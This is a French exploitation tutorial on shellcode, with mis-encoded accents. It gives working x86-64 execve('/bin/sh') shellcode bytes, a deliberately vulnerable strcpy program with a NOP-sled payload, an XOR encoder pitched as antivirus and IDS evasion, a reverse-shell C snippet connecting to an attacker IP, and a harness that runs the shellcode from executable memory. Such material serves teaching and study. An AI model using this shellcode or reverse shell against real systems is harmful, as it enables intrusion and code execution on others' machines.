# Cours : Shellcode - L'Injection de Code

## 1. Introduction - Qu'est-ce qu'un Shellcode ?

### 1.1 DÃ©finition pour DÃ©butants

Un **shellcode** est du **code machine** (bytes) qu'un attaquant injecte dans un programme vulnÃ©rable pour exÃ©cuter des commandes arbitraires.

**Analogie** : Imaginez un formulaire de contact sur un site web :
- **Usage normal** : Vous Ã©crivez "Bonjour, j'ai une question"
- **Attaque** : Vous Ã©crivez du code qui s'exÃ©cute sur le serveur

C'est la mÃªme chose en mÃ©moire :
- **Usage normal** : Buffer contient "John Smith"
- **Attaque** : Buffer contient du shellcode qui lance `/bin/sh`

### 1.2 Pourquoi "Shell"-code ?

Historiquement, le but Ã©tait d'obtenir un **shell** (terminal) sur la machine cible.

```ascii
MACHINE CIBLE AVANT :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Programme normal    â”‚
â”‚  tourne...           â”‚
â”‚  Pas d'accÃ¨s pour    â”‚
â”‚  l'attaquant         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

APRÃˆS INJECTION SHELLCODE :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  /bin/sh (shell)     â”‚  â† L'attaquant a un terminal !
â”‚  $ whoami            â”‚
â”‚  root                â”‚  â† Avec les droits du programme
â”‚  $ ls                â”‚
â”‚  ...                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 1.3 Le Processus d'Exploitation Complet

```ascii
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Ã‰TAPE 1 : Trouver une vulnÃ©rabilitÃ©                â”‚
â”‚  â”œâ”€ Buffer overflow                                 â”‚
â”‚  â”œâ”€ Format string                                   â”‚
â”‚  â””â”€ Use-after-free                                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Ã‰TAPE 2 : CrÃ©er le shellcode                       â”‚
â”‚  â”œâ”€ Ã‰crire en assembleur                            â”‚
â”‚  â”œâ”€ Compiler en bytes                               â”‚
â”‚  â””â”€ Ã‰viter les null bytes                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Ã‰TAPE 3 : Injecter le shellcode                    â”‚
â”‚  â”œâ”€ DÃ©border le buffer                              â”‚
â”‚  â”œâ”€ Ã‰craser l'adresse de retour                     â”‚
â”‚  â””â”€ Pointer vers le shellcode                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Ã‰TAPE 4 : ExÃ©cution                                â”‚
â”‚  â”œâ”€ Programme retourne                              â”‚
â”‚  â”œâ”€ Saute sur le shellcode                          â”‚
â”‚  â””â”€ Shell obtenu !                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## 2. Anatomie d'un Shellcode - Byte par Byte

### 2.1 Shellcode Minimal : exit(0)

Le plus simple des shellcodes : terminer proprement avec `exit(0)`.

**En C** :
```c
exit(0);
```

**En Assembleur x86-64 (Linux)** :
```asm
mov rax, 60      ; Syscall exit = 60
mov rdi, 0       ; Code de retour = 0
syscall          ; Appel systÃ¨me
```

**En Code Machine (Shellcode)** :
```
\xb8\x3c\x00\x00\x00    ; mov rax, 60
\xbf\x00\x00\x00\x00    ; mov rdi, 0
\x0f\x05                ; syscall
```

**ProblÃ¨me** : Contient des **null bytes** (\x00) !

### 2.2 Le ProblÃ¨me des Null Bytes

```ascii
POURQUOI LES NULL BYTES SONT UN PROBLÃˆME ?

Shellcode : \xb8\x3c\x00\x00\x00\xbf\x00...
                    â†‘   â†‘   â†‘   â†‘
                Null bytes (\x00)

INJECTION via strcpy() :

char buffer[100];
strcpy(buffer, shellcode);
              â†“
strcpy() s'arrÃªte au PREMIER \x00 !

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ \xb8\x3c\x00...                    â”‚
â”‚        â†‘                           â”‚
â”‚        â””â”€ strcpy() s'arrÃªte ici    â”‚
â”‚           Shellcode INCOMPLET !    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

RÃ‰SULTAT : Shellcode tronquÃ© = Ne fonctionne pas
```

### 2.3 Ã‰viter les Null Bytes - Techniques

#### Technique 1 : XOR pour mettre Ã  zÃ©ro

```asm
; Au lieu de :
mov rdi, 0          ; \xbf\x00\x00\x00\x00 (null bytes)

; Utiliser :
xor rdi, rdi        ; \x48\x31\xff (pas de null bytes)
```

**Visualisation** :
```ascii
XOR un registre avec lui-mÃªme = toujours 0

RDI = ???  (valeur alÃ©atoire)
XOR RDI, RDI
    â†“
RDI = 0  âœ… (sans null bytes dans l'instruction)
```

#### Technique 2 : Registres 32-bit

```asm
; Au lieu de :
mov rax, 60         ; Instruction longue

; Utiliser :
push 60
pop rax
; ou :
xor eax, eax        ; EAX = 0
mov al, 60          ; AL = 60 (partie basse de RAX)
```

### 2.4 Shellcode OptimisÃ© sans Null Bytes

```asm
; exit(0) sans null bytes
xor rdi, rdi        ; RDI = 0 (code de retour)
push 60
pop rax             ; RAX = 60 (syscall exit)
syscall             ; Appel systÃ¨me
```

**Bytes** : `\x48\x31\xff\x6a\x3c\x58\x0f\x05`

**Aucun null byte !** âœ…

## 3. Shellcode execve("/bin/sh") - Lancer un Shell

### 3.1 Le Syscall execve()

```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```

**Pour lancer un shell** :
```c
execve("/bin/sh", NULL, NULL);
```

**En assembleur** :
```asm
mov rax, 59         ; Syscall execve = 59
lea rdi, [binsh]    ; Argument 1 : "/bin/sh"
xor rsi, rsi        ; Argument 2 : NULL
xor rdx, rdx        ; Argument 3 : NULL
syscall
```

### 3.2 ProblÃ¨me : Comment Stocker "/bin/sh" ?

```ascii
CHALLENGE : Stocker la string "/bin/sh" dans le shellcode

SOLUTION 1 : Utiliser la Stack

push 0x68732f2f     ; "//sh" (inversÃ©, little endian)
push 0x6e69622f     ; "/bin" (inversÃ©)
mov rdi, rsp        ; RDI = adresse sur la stack

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  STACK APRÃˆS PUSH :                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  0x7fff00  â”‚ '/'                   â”‚
â”‚  0x7fff01  â”‚ 'b'                   â”‚
â”‚  0x7fff02  â”‚ 'i'                   â”‚
â”‚  0x7fff03  â”‚ 'n'                   â”‚
â”‚  0x7fff04  â”‚ '/'                   â”‚
â”‚  0x7fff05  â”‚ '/'                   â”‚ â† Padding
â”‚  0x7fff06  â”‚ 's'                   â”‚
â”‚  0x7fff07  â”‚ 'h'                   â”‚
â”‚  0x7fff08  â”‚ '\0' (dÃ©jÃ  lÃ )        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â†‘
      RDI pointe ici
```

### 3.3 Shellcode Complet

```asm
; execve("/bin/sh", NULL, NULL)
global _start

_start:
    ; Construire "/bin/sh" sur la stack
    xor rax, rax        ; RAX = 0
    push rax            ; Null terminator
    
    ; "/bin/sh" en little-endian, 8 bytes par push
    mov rbx, 0x68732f2f6e69622f  ; "//bin/sh" inversÃ©
    push rbx
    
    ; PrÃ©parer arguments
    mov rdi, rsp        ; RDI = adresse "/bin/sh"
    xor rsi, rsi        ; RSI = NULL (argv)
    xor rdx, rdx        ; RDX = NULL (envp)
    
    ; Appel execve
    push 59
    pop rax             ; RAX = 59 (execve)
    syscall
```

**Bytes (shellcode final)** :
```
\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68
\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05
```

**Taille** : 29 bytes

## 4. Injection et ExÃ©cution

### 4.1 Programme VulnÃ©rable

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // âŒ Pas de vÃ©rification de taille
}

int main(int argc, char **argv) {
    vulnerable_function(argv[1]);
    return 0;
}
```

### 4.2 Exploitation Visuelle

```ascii
MÃ‰MOIRE AVANT OVERFLOW :

STACK :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  Adresses basses
â”‚  return address: 0x400500      â”‚  8 bytes
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  saved RBP: 0x7fff...          â”‚  8 bytes
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  buffer[64]                    â”‚  64 bytes
â”‚  (vide)                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  Adresses hautes

ATTAQUE : Envoyer 64 bytes (buffer) + 8 bytes (RBP) + shellcode address

PAYLOAD :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ NOP sled       â”‚ Shellcode  â”‚ New ret addr â”‚
â”‚ (\x90 Ã— 40)    â”‚ (29 bytes) â”‚ 0x7fff50     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  Remplir buffer   Code evil    Pointeur vers
                                 notre shellcode

MÃ‰MOIRE APRÃˆS OVERFLOW :

STACK :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  return address: 0x7fff50      â”‚  â† Ã‰CRASÃ‰ !
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  Pointe vers
â”‚  saved RBP: (Ã©crasÃ©)           â”‚  le shellcode
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  buffer[64]                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ \x90\x90...(NOP sled)    â”‚  â”‚
â”‚  â”‚ \x48\x31\xc0...(shellcode)â”‚ â”‚  â† 0x7fff50
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

EXÃ‰CUTION :
1. vulnerable_function() termine
2. Programme fait "ret"
3. Saute Ã  0x7fff50 (notre shellcode)
4. Shellcode s'exÃ©cute
5. Shell lancÃ© ! ğŸ¯
```

## 5. NOP Sled - La Rampe de Glisse

### 5.1 Le ProblÃ¨me de PrÃ©cision

Difficile de deviner l'adresse exacte du shellcode Ã  cause de l'ASLR.

**Solution** : NOP sled (toboggan de NOP)

```ascii
NOP = No Operation (instruction qui ne fait rien)
Opcode : \x90

SANS NOP SLED :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Buffer                             â”‚
â”‚ ...                                â”‚
â”‚ 0x7fff50: Shellcode dÃ©but â† Doit pointer EXACTEMENT ici
â”‚ \x48\x31\xc0...                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â†‘
Si on se trompe de 1 byte â†’ Ã‰chec

AVEC NOP SLED :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Buffer                             â”‚
â”‚ 0x7fff00: \x90 (NOP)  â†“            â”‚
â”‚ 0x7fff01: \x90 (NOP)  â†“            â”‚
â”‚ 0x7fff02: \x90 (NOP)  â†“ Glisse    â”‚
â”‚ ...       \x90 ...    â†“            â”‚
â”‚ 0x7fff30: \x90 (NOP)  â†“            â”‚
â”‚ 0x7fff40: Shellcode dÃ©but          â”‚
â”‚ \x48\x31\xc0...                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
   â†‘
Pointeur n'importe oÃ¹ entre 0x7fff00
et 0x7fff3F â†’ Glisse jusqu'au shellcode âœ…
```

**Code du NOP** :
```c
// Remplir de NOP
memset(buffer, 0x90, 100);  // 100 Ã— NOP
// Puis ajouter shellcode Ã  la fin
memcpy(buffer + 100, shellcode, shellcode_len);
```

## 6. Shellcode Position-Independent

### 6.1 Le ProblÃ¨me de l'Adressage

```asm
; MAUVAIS (adresse absolue) :
mov rdi, 0x400000       ; Adresse hardcodÃ©e
                        ; Ne marchera pas avec ASLR

; BON (adresse relative) :
lea rdi, [rel binsh]    ; Adresse relative au PC
```

### 6.2 Technique : Utiliser la Stack

```ascii
ASTUCE : Pousser les donnÃ©es sur la stack

call get_address
.string "/bin/sh"

get_address:
    pop rsi             ; RSI = adresse de la string

EXPLICATION :

Ã‰TAPE 1 : call push l'adresse de retour

STACK :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 0x100005       â”‚  â† Adresse juste aprÃ¨s CALL
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      (= adresse de "/bin/sh")

Ã‰TAPE 2 : pop rÃ©cupÃ¨re cette adresse

RSI = 0x100005  â† Adresse de "/bin/sh" !

Fonctionne peu importe oÃ¹ le code est chargÃ©
```

## 7. Encoder le Shellcode

### 7.1 Pourquoi Encoder ?

**Raisons** :
1. Ã‰viter les null bytes
2. Bypasser les signatures antivirus
3. Ã‰chapper aux filtres (WAF, IDS)

### 7.2 XOR Encoding

```ascii
SHELLCODE ORIGINAL :
\x48\x31\xc0\x50\x48...

ENCODER avec clÃ© 0xAA :
Chaque byte XOR 0xAA

\x48 ^ 0xAA = 0xE2
\x31 ^ 0xAA = 0x9B
\x0 ^ 0xAA = 0x53
...

SHELLCODE ENCODÃ‰ :
\xE2\x9B\x53...

DECODER (au runtime) :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  STUB DECODER (en tÃªte)             â”‚
â”‚  â”œâ”€ Boucle sur shellcode encodÃ©     â”‚
â”‚  â”œâ”€ Chaque byte XOR 0xAA            â”‚
â”‚  â””â”€ Saute sur shellcode dÃ©codÃ©      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  SHELLCODE ENCODÃ‰                   â”‚
â”‚  \xE2\x9B\x53...                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

EXÃ‰CUTION :
1. Decoder s'exÃ©cute
2. DÃ©code le shellcode (XOR chaque byte)
3. Saute dessus
4. Shellcode original s'exÃ©cute
```

**Code du Decoder** :
```asm
decoder:
    jmp short call_decoder
    
decoder_stub:
    pop rsi                 ; RSI = adresse shellcode encodÃ©
    xor rcx, rcx
    mov cl, shellcode_len   ; Longueur
    
decode_loop:
    xor byte [rsi], 0xAA    ; DÃ©coder chaque byte
    inc rsi
    loop decode_loop
    
    jmp short shellcode     ; Sauter sur shellcode dÃ©codÃ©
    
call_decoder:
    call decoder_stub
    shellcode: db 0xE2, 0x9B, ...  ; Bytes encodÃ©s
```

## 8. Types de Shellcode

### 8.1 Bind Shell

Le serveur Ã©coute sur un port et attend la connexion de l'attaquant.

```ascii
MACHINE CIBLE                    ATTAQUANT
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Shellcode    â”‚                â”‚              â”‚
â”‚ exÃ©cutÃ©      â”‚                â”‚              â”‚
â”‚   â†“          â”‚                â”‚              â”‚
â”‚ bind(4444)   â”‚ â† Ã‰coute       â”‚              â”‚
â”‚ listen()     â”‚                â”‚              â”‚
â”‚ accept()     â”‚                â”‚              â”‚
â”‚   â†“          â”‚                â”‚   â†“          â”‚
â”‚ Attend...    â”‚ â†â”€â”€connectâ”€â”€â”€â”€ â”‚ nc IP 4444   â”‚
â”‚   â†“          â”‚                â”‚   â†“          â”‚
â”‚ /bin/sh      â”‚ â†â”€â”€commandesâ”€â”€ â”‚ whoami       â”‚
â”‚   â†“          â”‚ â”€â”€rÃ©sultatsâ”€â”€â†’ â”‚ root         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Avantages : ContrÃ´le complet
InconvÃ©nients : Firewall peut bloquer
```

### 8.2 Reverse Shell

La cible se connecte VERS l'attaquant (bypass firewall).

```ascii
ATTAQUANT                        MACHINE CIBLE
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ nc -l 4444   â”‚ â† Ã‰coute       â”‚              â”‚
â”‚ (listener)   â”‚                â”‚              â”‚
â”‚   â†“          â”‚                â”‚ Shellcode    â”‚
â”‚ Attend...    â”‚                â”‚ exÃ©cutÃ©      â”‚
â”‚   â†“          â”‚                â”‚   â†“          â”‚
â”‚ accept()     â”‚ â”€â”€connect()â”€â”€â† â”‚ connect(IP)  â”‚
â”‚   â†“          â”‚                â”‚   â†“          â”‚
â”‚ ReÃ§oit shell â”‚ â†â”€â”€/bin/shâ”€â”€â”€  â”‚ dup2()       â”‚
â”‚   â†“          â”‚                â”‚ execve()     â”‚
â”‚ whoami       â”‚ â”€â”€commandesâ”€â”€â†’ â”‚              â”‚
â”‚ root         â”‚ â†â”€â”€rÃ©sultatsâ”€â”€ â”‚              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Avantages : Bypass firewall sortant
InconvÃ©nients : Besoin d'un listener
```

**Code C simplifiÃ©** :
```c
int sock = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr = {
    .sin_family = AF_INET,
    .sin_port = htons(4444),
    .sin_addr.s_addr = inet_addr("10.0.0.1")  // IP attaquant
};
connect(sock, (struct sockaddr*)&addr, sizeof(addr));
dup2(sock, 0);  // stdin
dup2(sock, 1);  // stdout
dup2(sock, 2);  // stderr
execve("/bin/sh", NULL, NULL);
```

### 8.3 Staged vs Stageless

```ascii
STAGED (En Ã‰tapes) :

Stage 1 (petit, ~100 bytes) :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ TÃ©lÃ©charge stage 2      â”‚
â”‚ via rÃ©seau              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â†“ download
Stage 2 (gros, ~10 KB) :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ FonctionnalitÃ©s         â”‚
â”‚ complÃ¨tes               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Avantages :
âœ… Stage 1 petit (facile Ã  injecter)
âœ… Stage 2 peut Ãªtre gros et complexe

STAGELESS (Tout-en-Un) :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Shellcode complet       â”‚
â”‚ (tout inclus)           â”‚
â”‚ ~500 bytes              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Avantages :
âœ… Pas de dÃ©pendance rÃ©seau
âœ… Plus furtif (pas de tÃ©lÃ©chargement)
```

## 9. Protection et DÃ©tection

### 9.1 Protections Modernes

```ascii
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Protection       â”‚ Description                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ DEP/NX           â”‚ Data Execution Prevention    â”‚
â”‚                  â”‚ MÃ©moire RW OU RX (pas RWX)   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ASLR             â”‚ Randomise les adresses       â”‚
â”‚                  â”‚ Difficile de deviner oÃ¹      â”‚
â”‚                  â”‚ est le shellcode             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Stack Canary     â”‚ Valeur sentinelle avant      â”‚
â”‚                  â”‚ return address               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ CFI              â”‚ Control Flow Integrity       â”‚
â”‚                  â”‚ VÃ©rifie les sauts            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 9.2 Bypasser DEP avec ROP

```ascii
DEP activÃ© : Stack n'est PAS exÃ©cutable

STACK (RW seulement) :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Shellcode      â”‚  âŒ Ne peut pas exÃ©cuter
â”‚ \x48\x31...    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

SOLUTION : ROP (Return-Oriented Programming)

Au lieu d'exÃ©cuter le shellcode directement,
on rÃ©utilise des morceaux de code existants

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ROP Chain (suite d'adresses)         â”‚
â”‚ â”œâ”€ 0x400123 : pop rdi ; ret          â”‚
â”‚ â”œâ”€ 0x400456 : pop rsi ; ret          â”‚
â”‚ â”œâ”€ 0x400789 : syscall ; ret          â”‚
â”‚ â””â”€ ...                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Chaque adresse pointe vers un "gadget"
dans le code existant (RX, donc exÃ©cutable)
```

## 10. Tester un Shellcode Localement

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

int main() {
    // Shellcode execve("/bin/sh")
    unsigned char shellcode[] = 
        "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e"
        "\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31"
        "\xf6\x48\x31\xd2\x6a\x3b\x58\x0f\x05";
    
    // Allouer mÃ©moire exÃ©cutable
    void *exec_mem = mmap(NULL, sizeof(shellcode),
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    // Copier shellcode
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    
    // ExÃ©cuter
    void (*func)() = (void(*)())exec_mem;
    func();  // Lance le shellcode
    
    return 0;
}
```

```ascii
